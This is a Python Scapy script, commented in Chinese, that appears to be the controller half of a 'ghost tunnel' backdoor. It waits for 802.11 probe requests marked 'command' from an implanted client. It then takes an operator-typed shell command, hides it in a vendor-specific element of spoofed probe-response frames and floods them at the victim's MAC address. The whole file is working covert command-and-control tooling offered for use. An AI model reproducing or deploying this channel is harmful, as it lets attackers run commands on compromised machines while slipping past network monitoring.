#coding:utf-8
from scapy.all import *
import binascii
import time

#设置ssid和监听设备名
netSSID = 'yunsle_ghost_tunnel'       #Network name here
iface = 'wlan0'         #Interface name here

#Scapy参考设置
#beacon = Dot11Beacon(cap='ESS+privacy')
#essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
#rsn = Dot11Elt(ID='RSNinfo', info=(
#'\x01\x00'                 #RSN Version 1
#'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
#'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
#'\x00\x0f\xac\x04'         #AES Cipher
#'\x00\x0f\xac\x02'         #TKIP Cipher
#'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
#'\x00\x0f\xac\x02'         #Pre-Shared Key
#'\x00\x00'))               #RSN Capabilities (no extra capabilities)


#命令获取函数
def getCmd():
    cmd = raw_input("input the command to excute:\n")
    # cmd = "cmd /c notepad"
    #处理命令编码,转为16进制
    cmd_b = ""
    for i in cmd:
        cmd_b += binascii.a2b_hex(hex(ord(i))[2:4])
    print cmd_b
    return cmd_b

#命令封装为dot11elt帧
def getEltPayload(cmd):
    return Dot11Elt(ID=221, info=('\x63\x63\x63'+cmd))

#封装为dot11完整帧
def getPayloadFrame(cmd, ct_addr2, addr2, addr3):
    payload = getEltPayload(cmd)
    response_dot11 = Dot11(subtype=5, addr1=ct_addr2,
    addr2=addr2, addr3=addr2,SC=22222)
    return RadioTap()/response_dot11/Dot11ProbeResp()/Dot11Elt(ID='SSID', info="yunsle_ghost_tunnel")/payload

#发送包含控制指令的dot11帧
def sendCmd(frame):
    for i in range(0,3):
        sendp(frame, iface=iface, count=300)

#处理控制函数
def handle(packet):
    dot = packet.getlayer(Dot11)
    if dot!=None and dot.type==0 and dot.subtype==4:
        #帧数据转为字符串
        data=str(packet)
        #寻找客户端request帧携带的特定标识
        if data.find("command")>=0:
            # packet.show()
            print "#wake up#\n"
            #获取上线被控端的MAC地址
            ct_addr2 = packet.addr2
            #要执行的命令
            cmd = getCmd();
            #命令封装为802.11完整帧
            #参数1：执行的命令
            #参数2：目标端的MAC地址
            #参数3、4：发送帧中的addr2和addr3的MAC地址
            response_frame = getPayloadFrame(cmd, ct_addr2, '22:22:22:22:22:22', '33:33:33:33:33:33')
            #发送包含控制命令的Response帧
            sendCmd(response_frame)
            #这里只要发送完毕既退出
            exit(1)

if __name__ == "__main__":
    print "waiting for wake up......."
    #监听函数
    sniff(iface=iface, prn=handle)
